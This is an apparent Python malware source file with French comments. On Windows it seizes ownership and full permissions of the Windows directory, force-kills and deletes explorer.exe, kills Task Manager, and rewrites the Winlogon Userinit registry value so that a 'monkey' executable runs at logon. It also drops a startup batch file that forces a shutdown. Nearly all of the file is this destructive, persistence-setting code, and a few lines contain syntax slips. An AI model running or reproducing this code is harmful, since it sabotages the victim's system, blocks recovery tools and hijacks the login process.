#!/usr/bin/python
#coding:utf-8
import os, sys, winreg

lettre = os.environ["SystemDrive"]
user = os.environ["USERNAME"]

# Manipule les fichiers système à et déclaration des variables, appropriation du process, des permissions, kill puis supprime le process
class Seek_and_Destroy():

    #DECLARATION DES VARIABLES ET DES CHEMINS VERS LES FICHIERS SYSTEME
    def __init__(self):
        self.explorer         = "{}\\Windows\\explorer.exe".format(lettre)
        self.tsk              = "{}\\Windows\\taskmgr.exe.exe".format(lettre)
        self.path_to_takeown  = "START /MIN takeown /f"
        self.path_to_icacls   = "START /MIN icacls"
        self.repertoire_Users = "{}\\Users\\{}\\AppData\\Roaming\\monkey\\monkey.exe".format(lettre, user)
        self.repertoire_Win   = "{}\\Windows\\".format(lettre)
        self.win32            = "{}\\Windows\\System32\\".format(lettre)
        self.recursif         = "/R"
        self.kill             = "START /MIN taskkill /IM"
        self.forcefully       = "/F"
        self.forcefully2      = "/f"
        self.grant_permi_user = "/grant {}:F".format(user)
        self.delete_order     = "del"
        self.supp_key         = 'REG DELETE "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit'
        self.malicious_key    = f"{lettre}\\Users\\{user}\\AppData\\Roaming\\monkey\\main.exe, \
                                {lettre}\\Windows\\System32\\userinit.exe"


#UTILISATION DU TAKEOWN
    # s'approprie le processus
    def prise_de_own(self):
        try:
            self.get_ownership = f"{self.path_to_takeown} {self.repertoire_Win}"
            os.system(self.get_ownership)
        except:
            pass


#UTILISATION DU ICALCS
    # prend les permissions sur le processus
    def prise_de_permi(self):
        try:
            self.get_permissions = "{} {} {}".format(self.path_to_icacls, self.repertoire_Win, self.grant_permi_user)
            os.system(self.get_permissions)
        except:
            pass


#MANIPULATION DU PROCESSUS
    # Tue explorer.exe
    def kill_process_explorer(self):
        try:
            killed = "{} explorer.exe {}".format(self.kill, self.forcefully)
            os.system(killed)
        except:
            killed = 0
        return killed

    # supprime le processus
    def delete_process_explorer(self):
        try:
            suppression = "{} \\Windows\\System32\\explorer.exe ".format(self.delete_order)
            os.system(suppression)
        except:
            suppression = 0
        return suppression

    #Tue le gestionnaire des tâches
    def delete_tskmgr(self):
        try:
            remove = "{} {}taskmgr.exe".format(self.kill, self.forcefully)
            os.system(remove)
        except:
            remove = 0
        return remove

# ECRITURE DANS LE REGISTRE
    # Supprime la clé "Userinit" qui permet de loguer une session utilisateur
    # déclare la nouvelle règle à ajouter dans le registre windows
    # l'inscrit pour que le main se déclenche avant l'authentification utilisateur
    def suppression_clef(self):
        self.del_key_userinit = "{} {}".format(self.supp_key, self.forcefully2)
        os.system(self.del_key_userinit)

    def ecriture_registre(self):
        new_key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, 'Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon')
        winreg.SetValueEx(new_key, 'Userinit', 0, winreg.REG_SZ, self.malicious_key)
        winreg.CloseKey(new_key)

    def counter_measure(self):
        path = "C:\Users\MARCH\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
        file = "shutdown.bat"
        with open(os.path.join(path, file), 'w') as fp
            pass
            L = ["@echo off \n", "timeout 30 \n", "shutdown.exe /s /f"]
            fp.writelines(L)
            file.close()
